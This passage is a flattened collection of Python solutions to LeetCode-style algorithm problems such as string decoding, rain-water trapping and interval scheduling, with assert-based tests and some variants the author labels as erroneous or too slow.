i = j + 1
elif s[i].islower():
repeat = stk[-1] if stk else 1
for _ in xrange(repeat): ret.append(s[i])
i += 1
elif s[i] == ']':
stk.pop()
i += 1
return ''.join(ret)
if __name__ == "__main__":
assert Solution().decodeString('2[abc]3[cd]ef') == 'abcabccdcdcdef'
from collections import defaultdict
class Solution(object):
def longestSubstring(self, s, k):
if not s:
return 0
cnt = defaultdict(int)
for e in s: cnt[e] += 1
c = min(
s,
key=lambda x: cnt[x],
)
if cnt[c] >= k:
return len(s)
return max(
map(lambda x: self.longestSubstring(x, k), s.split(c))
)
import sys
class Solution(object):
def maxRotateFunction(self, A):
if not A: return 0
gmax = -sys.maxint
n = len(A)
s = sum(A)
cur = sum(idx * val for idx, val in enumerate(A))
for r in reversed(A):
cur = cur + s - n * r
gmax = max(gmax, cur)
return gmax
if __name__ == "__main__":
assert Solution().maxRotateFunction([4, 3, 2, 6]) == 26
class Solution(object):
def integerReplacement(self, n):
ret = 0
while n != 1:
ret += 1
if n & 1 == 0:
n >>= 1
elif n == 0b11 or n >> 1 & 1 == 0:
n -= 1
else:
n += 1
return ret
def integerReplacementRecur(self, n):
if n == 1: return 0
ret = 1
if n%2 == 0:
ret += self.integerReplacement(n/2)
else:
ret += min(self.integerReplacement(n+1), self.integerReplacement(n-1))
return ret
import random
class Solution(object):
def __init__(self, nums):
self.A = nums
def pick(self, target):
sz = 0
ret = None
for idx, val in enumerate(self.A):
if val == target:
sz += 1
p = random.randrange(0, sz)
if p == 0:
ret = idx
return ret
class SolutionError(object):
def __init__(self, nums):
self.d = {}
for idx, val in enumerate(nums):
if val not in self.d:
self.d[val] = (idx, 1)
else:
prev, sz = self.d[val]
p = random.randrange(0, sz)
if p < sz:
self.d[val] = (idx, sz + 1)
else:
self.d[val] = (prev, sz + 1)
def pick(self, target):
return self.d[target][0]
from collections import defaultdict
from itertools import izip
class Solution(object):
def calcEquation(self, equations, values, queries):
G = defaultdict(dict)
for edge, val in izip(equations, values):
s, e = edge
G[s][e], G[e][s] = val, 1/val
G[s][s], G[e][e] = 1, 1
return [self.dfs(G, s, e, set()) for s, e in queries]
def dfs(self, G, s, e, path):
if s not in G or e not in G:
return -1.0
if e in G[s]:
return G[s][e]
for nbr in G[s]:
if nbr not in path:
path.add(nbr)
val = self.dfs(G, nbr, e, path)
if val != -1.0:
return val * G[s][nbr]
path.remove(nbr)
return -1.0
class Solution(object):
def calcEquation(self, equations, values, queries):
G = defaultdict(dict)
for edge, val in izip(equations, values):
s, e = edge
G[s][e], G[e][s] = val, 1/val
G[s][s], G[e][e] = 1, 1
for mid in G:
for s in G[mid]:
for e in G[mid]:
G[s][e] = G[s][mid] * G[mid][e]
return [G[s].get(e, -1.0) for s, e in queries]
class Solution(object):
def findNthDigit(self, n):
digit_cnt = 1
num_cnt = 9
while n > digit_cnt * num_cnt:
n -= digit_cnt * num_cnt
digit_cnt += 1
num_cnt *= 10
n -= 1
q, r = n / digit_cnt, n % digit_cnt
target = num_cnt / 9 + q
return int(str(target)[r])
class Solution(object):
def __init__(self):
self.hours = (1, 2, 4, 8)
self.minutes = (1, 2, 4, 8, 16, 32)
def readBinaryWatch(self, num):
def gen():
for hour_n in xrange(min(num, 4)+1):
for hour in self.hour(hour_n):
for minute in self.minute(num-hour_n):
hour = str(hour)
minute = ('0' + str(minute))[-2:]
yield hour + ':' + minute
return list(gen())
def gen(self, n, head, lst, func):
if head == len(lst):
yield None
if n == 0:
yield 0
for i in xrange(head, len(lst)):
for rest in self.gen(n-1, i+1, lst, func):
if rest is not None:
ret = lst[i]+rest
if func(ret):
yield ret
else:
break
def hour(self, n):
return self.gen(n, 0, self.hours, lambda x: x < 12)
def minute(self, n):
return self.gen(n, 0, self.minutes, lambda x: x < 60)
if __name__ == "__main__":
assert Solution().readBinaryWatch(1) == ['0:01', '0:02', '0:04', '0:08', '0:16', '0:32', '1:00', '2:00', '4:00',
'8:00']
class Solution(object):
def removeKdigits(self, num, k):
stk = []
for char in num:
while k and stk and stk[-1] > char:
stk.pop()
k -= 1
stk.append(char)
for _ in xrange(k): stk.pop()
return ''.join(stk).lstrip('0') or '0'
class Solution(object):
def canCross(self, stones):
F = {}
for stone in stones:
F[stone] = set()
F[0].add(0)
for stone in stones:
for step in F[stone]:
for i in (-1, 0, 1):
nxt = stone + step + i
if nxt != stone and nxt in F:
F[nxt].add(step + i)
return True if F[stones[-1]] else False
if __name__ == "__main__":
assert Solution().canCross([0, 2]) == False
assert Solution().canCross([0, 1, 3, 5, 6, 8, 12, 17]) == True
assert Solution().canCross([0, 1, 2, 3, 4, 8, 9, 11]) == False
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def __init__(self):
self.s = 0
def sumOfLeftLeaves(self, root):
self.traverse(root)
return self.s
def traverse(self, node):
if not node:
return
if node.left and not node.left.left and not node.left.right:
self.s += node.left.val
self.traverse(node.left)
self.traverse(node.right)
class Solution(object):
def toHex(self, num):
ret = []
while len(ret) < 8 and num:
ret.append(self.encode(num & 0xf))
num >>= 4
return ''.join(ret[::-1]) or '0'
def toHexNormal(self, num):
ret = []
while len(ret) < 8 and num:
ret.append(self.encode(num % 16))
num /= 16
return ''.join(ret[::-1]) or '0'
def encode(self, d):
if 0 <= d < 10:
return str(d)
return chr(ord('a') + d - 10)
if __name__ == "__main__":
assert Solution().toHex(-1) == 'ffffffff'
from collections import defaultdict
class Node(object):
def __init__(self, lo, hi, cnt):
self.lo = lo
self.hi = hi
self.cnt = cnt
self.left = None
self.right = None
def __repr__(self):
return repr("[%d,%d)" % (self.lo, self.hi))
class SegmentTree(object):
def __init__(self):
self.root = None
def build(self, lo, hi):
if lo >= hi: return
if lo == hi-1: return Node(lo, hi, 1)
root = Node(lo, hi, hi-lo)
root.left = self.build(lo, (hi+lo)/2)
root.right = self.build((lo+hi)/2, hi)
return root
def find_delete(self, root, sz):
root.cnt -= 1
if not root.left:
return root.lo
elif root.left.cnt >= sz:
return self.find_delete(root.left, sz)
else:
return self.find_delete(root.right,
sz-root.left.cnt)
class Solution(object):
def reconstructQueue(self, A):
def cmp(a, b):
if a[0] != b[0]:
return a[0]-b[0]
else:
return a[1]-b[1]
st = SegmentTree()
n = len(A)
st.root = st.build(0, n)
A.sort(cmp=cmp)
ret = [0]*n
ret_cnt = defaultdict(int)
for a in A:
val, inv = a
idx = st.find_delete(st.root, inv+1-ret_cnt[val])
ret_cnt[val] += 1
ret[idx] = a
return ret
if __name__ == "__main__":
assert Solution().reconstructQueue(
[[9, 0], [7, 0], [1, 9], [3, 0], [2, 7], [5, 3], [6, 0], [3, 4], [6, 2], [5, 2]]) == [[3, 0], [6, 0], [7, 0],
[5, 2], [3, 4], [5, 3],
[6, 2], [2, 7], [9, 0],
[1, 9]]
import heapq
class Cell:
def __init__(self, i, j, h):
self.i = i
self.j = j
self.h = h
def __cmp__(self, other):
return self.h - other.h
class Solution(object):
def __init__(self):
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]
def trapRainWater(self, mat):
if not mat: return 0
m, n = len(mat), len(mat[0])
visited = [[False for _ in xrange(n)] for _ in xrange(m)]
h = []
for i in xrange(m):
visited[i][0] = True
heapq.heappush(h, Cell(i, 0, mat[i][0]))
visited[i][n-1] = True
heapq.heappush(h, Cell(i, n-1, mat[i][n-1]))
for j in xrange(1, n-1):
visited[0][j] = True
heapq.heappush(h, Cell(0, j, mat[0][j]))
visited[m-1][j] = True
heapq.heappush(h, Cell(m-1, j, mat[m-1][j]))
trapped = 0
while h:
cur = heapq.heappop(h)
for dir in self.dirs:
I, J = cur.i+dir[0], cur.j+dir[1]
if 0 <= I < m and 0 <= J < n and not visited[I][J]:
nxt = Cell(I, J, mat[I][J])
if nxt.h < cur.h:
trapped += cur.h - nxt.h
nxt.h = cur.h
visited[I][J] = True
heapq.heappush(h, nxt)
return trapped
if __name__ == "__main__":
assert Solution().trapRainWater([
[12, 13, 0, 12],
[13, 4, 13, 12],
[13, 8, 10, 12],
[12, 13, 12, 12],
[13, 13, 13, 13]]
) == 14
assert Solution().trapRainWater([
[9, 1, 10, 10],
[9, 1, 2, 8],
[2, 6, 5, 0],
[6, 0, 9, 0]]
) == 0
class Solution(object):
def validWordAbbreviation(self, word, abbr):
w = 0
a = 0
while w < len(word) and a < len(abbr):
if abbr[a].isdigit() and abbr[a] != '0':
e = a
while e < len(abbr) and abbr[e].isdigit(): e += 1
num = int(abbr[a:e])
a = e
w += num
else:
if word[w] != abbr[a]:
return False
w += 1
a += 1
return w == len(word) and a == len(abbr)
if __name__ == "__main__":
assert Solution().validWordAbbreviation("internationalization", "i12iz4n") == True
assert Solution().validWordAbbreviation("apple", "a2e") == False
from collections import defaultdict
class Solution(object):
def longestPalindrome(self, s):
c = defaultdict(int)
for elt in s:
c[elt] += 1
ret = 0
for v in c.values():
ret += (v/2) * 2
if any(map(lambda x: x % 2 == 1, c.values())):
ret += 1
return ret
if __name__ == "__main__":
assert Solution().longestPalindrome("abccccdd") == 7
from typing import List
from functools import lru_cache
class SolutionDP:
def splitArray(self, nums: List[int], m: int) -> int:
n = len(nums)
sums = [0]
for e in nums:
sums.append(sums[-1] + e)
F = [[float("inf") for _ in range(m + 1)] for _ in range(n + 1)]
for l in range(1, n + 1):
F[l][1] = sums[l] - sums[0]
for l in range(1, n + 1):
for k in range(1, m + 1):
for j in range(l):
F[l][k] = min(
F[l][k], max(F[j][k-1], sums[l] - sums[j])
)
return F[n][m]
class Solution:
def splitArray(self, nums: List[int], m: int) -> int:
lo = max(nums)
hi = sum(nums) + 1
ret = hi
while lo < hi:
mid = (lo + hi) // 2
cnt = 1
cur_sum = 0
for e in nums:
if cur_sum + e > mid:
cnt += 1
cur_sum = e
else:
cur_sum += e
if cnt <= m:
ret = min(ret, mid)
hi = mid
else:
lo = mid + 1
return ret
class SolutionTLE2:
def __init__(self):
self.sums = [0]
def splitArray(self, nums: List[int], m: int) -> int:
for n in nums:
self.sums.append(self.sums[-1] + n)
ret = self.dfs(len(nums), m)
return ret
@lru_cache(maxsize=None)
def dfs(self, hi, m):
if m == 1:
return self.sums[hi] - self.sums[0]
mini = float("inf")
for j in range(hi):
right = self.sums[hi] - self.sums[j]
left = self.dfs(j, m - 1)
mini = min(mini, max(left, right))
return mini
class SolutionTLE:
def __init__(self):
self.sums = [0]
def splitArray(self, nums: List[int], m: int) -> int:
for n in nums:
self.sums.append(self.sums[-1] + n)
ret = self.dfs(tuple(nums), 0, len(nums), m)
return ret
@lru_cache(maxsize=None)
def dfs(self, nums, lo, hi, m):
if m == 1:
return self.sums[hi] - self.sums[lo]
mini = float("inf")
for j in range(lo, hi):
left = self.sums[j] - self.sums[lo]
right = self.dfs(nums, j, hi, m - 1)
mini = min(mini, max(left, right))
return mini
if __name__ == "__main__":
assert Solution().splitArray([1, 4, 4], 3) == 4
assert Solution().splitArray([7,2,5,10,8], 2) == 18
class Solution(object):
def minAbbreviation(self, target, dictionary):
ret = (target, len(target))
for abbr, abbr_l in self.dfs(target):
if self.validate(dictionary, abbr) and ret[1] > abbr_l:
ret = (abbr, abbr_l)
return ret[0]
def dfs(self, word):
if not word:
return [("", 0)]
ret = []
for l in xrange(len(word)+1):
left_num = str(l) if l else ""
left_l = 1 if left_num != "" else 0
left_l += 1 if l < len(word) else 0
for right, right_l in self.dfs(word[l+1:]):
cur = left_num + word[l:l+1] + right
ret.append((cur, left_l + right_l))
return ret
def validate(self, dictionary, abbr):
for w in dictionary:
if self.validWordAbbreviation(w, abbr):
return False
return True
def validWordAbbreviation(self, word, abbr):
w = 0
a = 0
while w < len(word) and a < len(abbr):
if abbr[a].isdigit() and abbr[a] != '0':
e = a
while e < len(abbr) and abbr[e].isdigit(): e += 1
num = int(abbr[a:e])
a = e
w += num
else:
if word[w] != abbr[a]:
return False
w += 1
a += 1
return w == len(word) and a == len(abbr)
if __name__ == "__main__":
assert Solution().minAbbreviation("apple", ["blade"]) == "a4"
class Solution(object):
def fizzBuzz(self, n):
ret = []
for i in xrange(1, n+1):
cur = ""
if i % 3 == 0:
cur += "Fizz"
if i % 5 == 0:
cur += "Buzz"
if not cur:
cur = str(i)
ret.append(cur)
return ret
class Solution:
def count(self, l):
return (l-1) * l // 2
def numberOfArithmeticSlices(self, A):
ret = 0
if len(A) < 3:
return ret
delta = []
for i in range(1, len(A)):
delta.append(A[i] - A[i-1])
s = 0
e = 0
while s < len(delta):
while e < len(delta) and delta[s] == delta[e]:
e += 1
l = e - s
ret += self.count(l)
s = e
return ret
if __name__ == "__main__":
assert Solution().numberOfArithmeticSlices([1, 2, 3, 4]) == 3
import heapq
class Solution:
def thirdMax(self, nums):
if not nums:
return None
h = []
for e in set(nums):
if len(h) < 3:
heapq.heappush(h, e)
elif len(h) == 3 and e > h[0]:
heapq.heappushpop(h, e)
assert len(h) <= 3
if len(h) == 3:
ret = min(h)
else:
ret = max(h)
return ret
if __name__ == "__main__":
assert Solution().thirdMax([1, 2, 3, 4]) == 2
assert Solution().thirdMax([4, 3, 2, 1]) == 2
assert Solution().thirdMax([2, 2, 3, 1]) == 1
assert Solution().thirdMax([4, 3]) == 4
class Solution:
def int(self, n):
return ord(n) - ord("0")
def addStrings(self, num1, num2):
ret = []
if len(num1) > len(num2):
num1, num2 = num2, num1
num1 = num1[::-1]
num2 = num2[::-1]
carry = 0
idx = 0
while idx < len(num2):
if idx < len(num1):
s = self.int(num1[idx]) + self.int(num2[idx]) + carry
else:
s = self.int(num2[idx]) + carry
if s >= 10:
s -= 10
carry = 1
else:
carry = 0
ret.append(s)
idx += 1
if carry:
ret.append(carry)
return "".join(map(str, ret[::-1]))
if __name__ == "__main__":
assert Solution().addStrings("9999", "1") == "10000"
assert Solution().addStrings("9999", "9999") == "19998"
assert Solution().addStrings("23", "8") == "31"
from collections import defaultdict
class Solution:
def canPartition(self, nums):
if not nums:
return False
s = sum(nums)
if s % 2 != 0:
return False
target = s // 2
d = defaultdict(lambda: defaultdict(int))
d[0][0] = 1
d[0][nums[0]] = 1
for i in range(1, len(nums)):
for v in range(target + 1):
d[i][v] = d[i-1][v] + d[i-1][v-nums[i]]
return any(d[i][target] > 0 for i in range(len(nums)))
def canPartition_TLE(self, nums):
nums.sort()
s = sum(nums)
if s % 2 != 0:
return False
target = s // 2
return self.dfs(nums, 0, target)
def dfs(self, nums, idx, target):
if not idx < len(nums):
return False
if nums[idx] == target:
return True
if nums[idx] > target:
return False
return (
self.dfs(nums, idx + 1, target) or
self.dfs(nums, idx + 1, target - nums[idx])
)
if __name__ == "__main__":
assert Solution().canPartition([1, 5, 11, 5]) == True
assert Solution().canPartition([1, 2, 3, 5]) == False
dirs = ((0, 1), (0, -1), (1, 0), (-1, 0))
class Solution:
def pacificAtlantic(self, matrix):
if not matrix or not matrix[0]:
return []
m, n = len(matrix), len(matrix[0])
P = [[False for _ in range(n)] for _ in range(m)]
A = [[False for _ in range(n)] for _ in range(m)]
for i in range(m):
self.dfs(matrix, i, 0, P)
self.dfs(matrix, i, n-1, A)
for j in range(n):
self.dfs(matrix, 0, j, P)
self.dfs(matrix, m-1, j, A)
ret = [
[i, j]
for i in range(m)
for j in range(n)
if P[i][j] and A[i][j]
]
return ret
def dfs(self, matrix, i, j, C):
C[i][j] = True
m, n = len(matrix), len(matrix[0])
for x, y in dirs:
I = i + x
J = j + y
if 0 <= I < m and 0 <= J < n and matrix[i][j] <= matrix[I][J]:
if not C[I][J]:
self.dfs(matrix, I, J, C)
def pacificAtlantic_error(self, matrix):
if not matrix or not matrix[0]:
return []
m, n = len(matrix), len(matrix[0])
P = [[False] * n ] * m
A = [[False] * n ] * m
visisted = [[False] * n ] * m
for i in range(m):
for j in range(n):
self.dfs_error(matrix, i, j, visisted, P, lambda i, j: i < 0 or j <0)
visisted = [[False] * n ] * m
for i in range(m):
for j in range(n):
self.dfs_error(matrix, i, j, visisted, A, lambda i, j: i >= m or j >= n)
ret = [
[i, j]
for i in range(m)
for j in range(n)
if P[i][j] and A[i][j]
]
return ret
def dfs_error(self, matrix, i, j, visisted, C, predicate):
m, n = len(matrix), len(matrix[0])
if visisted[i][j]:
return C[i][j]
visisted[i][j] = True
for x, y in dirs:
i2 = i + x
j2= j + y
if 0 <= i2 < m and 0 <= j2 < n:
if self.dfs_error(matrix, i2, j2, visisted, C, predicate) and matrix[i][j] >= matrix[i2][j2]:
C[i][j] = True
elif predicate(i2, j2):
C[i][j] = True
return C[i][j]
if __name__ == "__main__":
assert Solution().pacificAtlantic([
[1,2,2,3,5],
[3,2,3,4,4],
[2,4,5,3,1],
[6,7,1,4,5],
[5,1,1,2,4]
]) == [[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]]
from typing import List
class Solution:
def wordsTyping(self, sentence: List[str], rows: int, cols: int) -> int:
sentence = " ".join(sentence) + " "
i = 0
for r in range(rows):
i += cols
while sentence[i % len(sentence)] != " ":
i -= 1
i += 1
ret = i // len(sentence)
return ret
class Solution:
def findMaximumXOR(self, nums):
ret = 0
for i in reversed(range(32)):
prefixes = set(num >> i for num in nums)
ret <<= 1
cur = ret + 1
for p in prefixes:
if cur ^ p in prefixes:
ret = cur
break
return ret
if __name__ == "__main__":
assert Solution().findMaximumXOR([3, 10, 5, 25, 2, 8]) == 28
import string
import operator
class Solution:
def characterReplacement(self, s, k):
counter = {
alphabet: 0
for alphabet in string.ascii_uppercase
}
lo = 0
ret = 0
assert k > 0
for hi in range(len(s)):
counter[s[hi]] += 1
while True:
most = max(counter.values())
l = hi - lo + 1
if l - most > k:
counter[s[lo]] -= 1
lo += 1
else:
ret = max(ret, l)
break
return ret
if __name__ == "__main__":
assert Solution().characterReplacement("AABABBA", 1) == 4
assert Solution().characterReplacement("ABAB", 2) == 4
class Node:
def __init__(self, val, isLeaf, topLeft, topRight, bottomLeft, bottomRight):
self.val = val
self.isLeaf = isLeaf
self.topLeft = topLeft
self.topRight = topRight
self.bottomLeft = bottomLeft
self.bottomRight = bottomRight
class Solution:
def construct(self, grid):
l = len(grid)
return self._construct(grid, 0, 0, l)
def _construct(self, grid, row, col, l):
if l == 1:
return Node(grid[row][col], True, None, None, None, None)
l_child = l // 2
topLeft = self._construct(grid, row, col, l_child)
topRight = self._construct(grid, row, col + l_child, l_child)
bottomLeft = self._construct(grid, row + l_child, col, l_child)
bottomRight = self._construct(grid, row + l_child, col + l_child, l_child)
is_leaf = (
topLeft.val == topRight.val == bottomLeft.val == bottomRight.val
!= "*"
)
if is_leaf:
return Node(grid[row][col], True, None, None, None, None)
return Node("*", False, topLeft, topRight, bottomLeft, bottomRight)
class Node:
def __init__(self, val, children):
self.val = val
self.children = children
class Solution:
def levelOrder(self, root):
if not root:
return []
q = [root]
ret = []
while q:
cur = []
q_new = []
for e in q:
q_new.extend(e.children)
cur.append(e.val)
ret.append(cur)
q = q_new
return ret
class Solution:
def is_neighbor(self, p, q):
diff = 0
for a, b in zip(p, q):
if a != b:
diff += 1
if diff > 1:
return False
return True
def minMutation(self, start, end, bank):
q = [start]
visited = {start}
lvl = 0
while q:
cur_q = []
for e in q:
if e == end:
return lvl
for t in bank:
if t not in visited and self.is_neighbor(e, t):
visited.add(t)
cur_q.append(t)
lvl += 1
q = cur_q
return -1
if __name__ == "__main__":
assert Solution().minMutation("AACCTTGG", "AATTCCGG", ["AATTCCGG","AACCTGGG","AACCCCGG","AACCTACC"]) == -1
assert Solution().minMutation("AACCGGTT", "AAACGGTA", ["AACCGGTA", "AACCGCTA", "AAACGGTA"]) == 2
class Solution:
def countSegments(self, s):
ret = 0
if not s:
return ret
if s[0] != " ":
ret = 1
prev = s[0]
for c in s[1:]:
if c != " " and prev == " ":
ret += 1
prev = c
return ret
if __name__ == "__main__":
assert Solution().countSegments("Hello, my name is John") == 5
class Interval:
def __init__(self, s=0, e=0):
self.start = s
self.end = e
@classmethod
def new(cls, lst):
return [
cls(s, e)
for s, e in lst
]
class Solution:
def eraseOverlapIntervals(self, intervals):
ret = 0
if not intervals:
return ret
intervals.sort(key=lambda x: x.start)
cur = intervals[0]
for itv in intervals[1:]:
if cur.end <= itv.start:
cur = itv
else:
ret += 1
cur = cur if cur.end < itv.end else itv
return ret
if __name__ == "__main__":
assert Solution().eraseOverlapIntervals(Interval.new([ [1,2], [2,3], [3,4], [1,3] ])) == 1
assert Solution().eraseOverlapIntervals(Interval.new([ [1,2], [1,2], [1,2] ])) == 2
assert Solution().eraseOverlapIntervals(Interval.new([ [1,2], [2,3] ])) == 0
class Interval:
def __init__(self, s=0, e=0):
self.start = s
self.end = e
@classmethod
def new(cls, lst):
return [
cls(s, e)
for s, e in lst
]
from bisect import bisect_left
class Solution:
def findRightInterval(self, intervals):
indexes = {
itv.start: idx
for idx, itv in enumerate(intervals)
}
starts = list(sorted(indexes.keys()))
ret = []
for itv in intervals:
idx = bisect_left(starts, itv.end)
if idx >= len(starts):
ret.append(-1)
else:
ret.append(
indexes[starts[idx]]
)
return ret
if __name__ == "__main__":
assert Solution().findRightInterval(Interval.new([ [3,4], [2,3], [1,2] ])) == [-1, 0, 1]
assert Solution().findRightInterval(Interval.new([ [1,2] ])) == [-1]
assert Solution().findRightInterval(Interval.new([ [1,4], [2,3], [3,4] ])) == [-1, 2, -1]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from collections import defaultdict
class Solution:
def __init__(self):
self.count = 0
def pathSum(self, root: TreeNode, target: int) -> int:
self.dfs(root, target, 0, defaultdict(int))
return self.count
def dfs(self, node, target, cur_sum, prefix_sum_counter):
if not node:
return
cur_sum += node.val
delta = cur_sum - target
self.count += prefix_sum_counter[delta]
if delta == 0:
self.count += 1
prefix_sum_counter[cur_sum] += 1
self.dfs(node.left, target, cur_sum, prefix_sum_counter)
self.dfs(node.right, target, cur_sum, prefix_sum_counter)
prefix_sum_counter[cur_sum] -= 1
class SolutionComplex:
def pathSum(self, root, sum):
count = [0]
self.dfs(root, sum, 0, {}, count)
return count[0]
def dfs(self, root, sum, cur_sum, prefix_sum, count):
if not root:
return
cur_sum += root.val
diff = cur_sum - sum
if diff in prefix_sum:
count[0] += prefix_sum[diff]
if diff == 0:
count[0] += 1
prefix_sum[cur_sum] = prefix_sum.get(cur_sum, 0) + 1
self.dfs(root.left, sum, cur_sum, prefix_sum, count)
self.dfs(root.right, sum, cur_sum, prefix_sum, count)
prefix_sum[cur_sum] -= 1
from collections import Counter
class Solution:
def findAnagrams(self, s, target):
ret = []
counter_target = Counter(target)
counter_cur = Counter(s[:len(target)])
if counter_cur == counter_target:
ret.append(0)
for idx in range(len(target), len(s)):
head = s[idx - len(target)]
tail = s[idx]
counter_cur[tail] += 1
counter_cur[head] -= 1
if counter_cur[head] == 0:
del counter_cur[head]
if counter_cur == counter_target:
ret.append(idx - len(target) + 1)
return ret
if __name__ == "__main__":
assert Solution().findAnagrams("cbaebabacd", "abc") == [0, 6]
class Solution:
def parseTernary(self, expression: str) -> str:
stk = []
for c in reversed(expression):
if stk and stk[-1] == "?":
stk.pop()
first = stk.pop()
stk.pop()
second = stk.pop()
if c == "T":
stk.append(first)
else:
stk.append(second)
else:
stk.append(c)
return stk[0]
def parseTernary_complex(self, expression: str) -> str:
n = len(expression)
stk = []
i = n - 1
while i >= 0:
j = i
while j >= 0 and expression[j] not in (":", "?"):
j -= 1
if j < i:
stk.append(expression[j+1:i+1])
if expression[j] == ":":
i = j - 1
else:
i = j - 1
if expression[i] == "T":
a = stk.pop()
stk.pop()
stk.append(a)
i -= 1
else:
stk.pop()
i -= 1
return stk[0]
if __name__ == "__main__":
assert Solution().parseTernary("F?1:T?4:5") == "4"
assert Solution().parseTernary("T?T?F:5:3") == "F"
class Solution:
def arrangeCoins(self, n):
return int(
(2*n + 1/4)**(1/2)  - 1/2
)
if __name__ == "__main__":
assert Solution().arrangeCoins(5) == 2
assert Solution().arrangeCoins(8) == 3
class Solution:
def idx(self, a):
return a - 1
def findDuplicates(self, A):
for i in range(len(A)):
t = self.idx(A[i])
while i != t:
if A[i] == A[t]:
break
else:
A[i], A[t] = A[t], A[i]
t = self.idx(A[i])
ret = []
for i in range(len(A)):
if self.idx(A[i]) != i:
ret.append(A[i])
return ret
if __name__ == "__main__":
assert set(Solution().findDuplicates([4,3,2,7,8,2,3,1])) == set([2,3])
class Solution:
def compress(self, chars):
ret = 1
s = 0
for i in range(1, len(chars) + 1):
if i < len(chars) and chars[i] == chars[s]:
continue
l = i - s
if l > 1:
for digit in str(l):
chars[ret] = digit
ret += 1
if i < len(chars):
chars[ret] = chars[i]
ret += 1
s = i
return ret
def compress_error(self, chars):
s = 0
for idx in range(1, len(chars) + 1):
if idx < len(chars) and chars[idx] == chars[s]:
continue
l = idx - s
if l == 1:
s = min(s + 1, len(chars) - 1)
else:
for digit in str(l):
s += 1
chars[s] = digit
if idx < len(chars):
s += 1
chars[s] = chars[idx]
return s + 1
if __name__ == "__main__":
assert Solution().compress(["a"]) == 1
assert Solution().compress(["a","a","b","b","c","c","c"]) == 6
assert Solution().compress(["a","b","b","b","b","b","b","b","b","b","b","b","b"]) == 4
from collections import defaultdict
class Solution:
def numberOfArithmeticSlices(self, A):
ret = 0
D = defaultdict(lambda: defaultdict(int))
for i in range(len(A)):
for j in range(i):
d = A[i] - A[j]
D[i][d] += 1 + D[j][d]
if D[j][d] > 0:
ret += D[j][d]
return ret
def numberOfArithmeticSlices_error(self, A):
ret = 0
D = defaultdict(lambda: defaultdict(int))
for i in range(len(A)):
for j in range(i):
delta = A[i] - A[j]
D[i][delta] += 1 + D[j][delta]
for j in range(i):
delta = A[i] - A[j]
if D[j][delta] > 0:
ret += D[i][delta]
return ret
if __name__ == "__main__":
assert Solution().numberOfArithmeticSlices([2, 4, 6, 8, 10]) == 7
from collections import Counter
class Solution:
def distance(self, a, b):
return (a[0] - b[0])**2 + (a[1] - b[1])**2
def numberOfBoomerangs(self, points):
ret = 0
for i in range(len(points)):
dist_cnt = Counter()
for j in range(len(points)):
if i != j:
d = self.distance(points[i], points[j])
dist_cnt[d] += 1
for v in dist_cnt.values():
ret += v * (v - 1)
return ret
def numberOfBoomerangs_TLE(self, points):
ret = 0
for i in range(len(points)):
dist_cnt = Counter()
dist_lst = []
for j in range(len(points)):
if i != j:
d = self.distance(points[i], points[j])
dist_lst.append(d)
dist_cnt[d] += 1
for d in dist_lst:
ret += (dist_cnt[d] - 1)
return ret
if __name__ == "__main__":
assert Solution().numberOfBoomerangs([[0,0],[1,0],[2,0]]) == 2
class Solution:
def findDisappearedNumbers(self, A):
for idx in range(len(A)):
while True:
target = A[idx] - 1
if idx == target or A[idx] == A[target]:
break
A[idx], A[target] = A[target], A[idx]
missing = []
for idx, elm in enumerate(A):
if idx != elm - 1:
missing.append(idx + 1)
return missing
if __name__ == "__main__":
assert Solution().findDisappearedNumbers([4, 3, 2, 7, 8, 2, 3, 1]) == [5, 6]
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Codec:
DELIMITER = ","
def serialize(self, root):
def traverse(root, ret):
if not root:
return
ret.append(root.val)
traverse(root.left, ret)
traverse(root.right, ret)
ret = []
traverse(root, ret)
return self.DELIMITER.join(map(str, ret))
def deserialize(self, data):
if not data:
return
lst = list(map(int, data.split(self.DELIMITER)))
root = TreeNode(lst[0])
def insert(root, val):
if val < root.val:
if not root.left:
root.left = TreeNode(val)
else:
insert(root.left, val)
else:
if not root.right:
root.right = TreeNode(val)
else:
insert(root.right, val)
for a in lst[1:]:
insert(root, a)
return root
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def deleteNode(self, root, key):
return self._delete(root, key)
def _delete(self, root, key):
if not root:
return
if key < root.val:
root.left = self._delete(root.left, key)
return root
elif key > root.val:
root.right = self._delete(root.right, key)
return root
else:
if root.left:
maxa, left = self._pop_max(root.left)
root.left = left
root.val = maxa
return root
elif root.right:
mini, right = self._pop_min(root.right)
root.right = right
root.val = mini
return root
else:
return
def _pop_max(self, root):
if root.right:
maxa, right = self._pop_max(root.right)
root.right = right
return maxa, root
else:
return root.val, root.left
def _pop_min(self, root):
if root.left:
mini, left = self._pop_min(root.left)
root.left = left
return mini, root
else:
return root.val, root.right
def _delete_error(self, root, key):
if not root:
return
if key < root.val:
root.left = self._delete(root.left, key)
return root
elif key > root.val:
root.right = self._delete(root.right, key)
return root
else:
if root.left:
root.val = root.left.val
left = self._delete(root.left, root.left.val)
root.left = left
return root
elif root.right:
root.val = root.right.val
right = self._delete(root.right, root.right.val)
root.right = right
return root
else:
return
from collections import defaultdict
class Solution(object):
def frequencySort(self, s):
counter = defaultdict(int)
for c in s:
counter[c] += 1
bucket = {count: [] for count in range(1, len(s)+1)}
for k, v in counter.items():
bucket[v].append(k)
ret = []
for count in reversed(range(1, len(s) + 1)):
if bucket[count]:
for c in bucket[count]:
ret.append(c * count)
return "".join(ret)
if __name__ == "__main__":
assert Solution().frequencySort("tree") == "eetr"
import heapq
class Balloon:
def __init__(self, s, e):
self.s = s
self.e = e
def __lt__(self, other):
return self.e < other.e
class Solution:
def findMinArrowShots(self, points):
ret = 0
points.sort(key=lambda x: x[0])
heap = []
for point in points:
s, e = point
if heap and heap[0].e < s:
ret += 1
heap = []
heapq.heappush(heap, Balloon(s, e))
if heap:
ret += 1
return ret
if __name__ == "__main__":
assert Solution().findMinArrowShots([[10,16], [2,8], [1,6], [7,12]]) == 2
class Solution:
def minMoves(self, nums):
mini = min(nums)
return sum(map(lambda e: e - mini, nums))
if __name__ == "__main__":
assert Solution().minMoves([1, 2, 3]) == 3
from collections import defaultdict
class Solution:
def fourSumCount(self, A, B, C, D):
N = len(A)
AB = defaultdict(int)
CD = defaultdict(int)
for i in range(N):
for j in range(N):
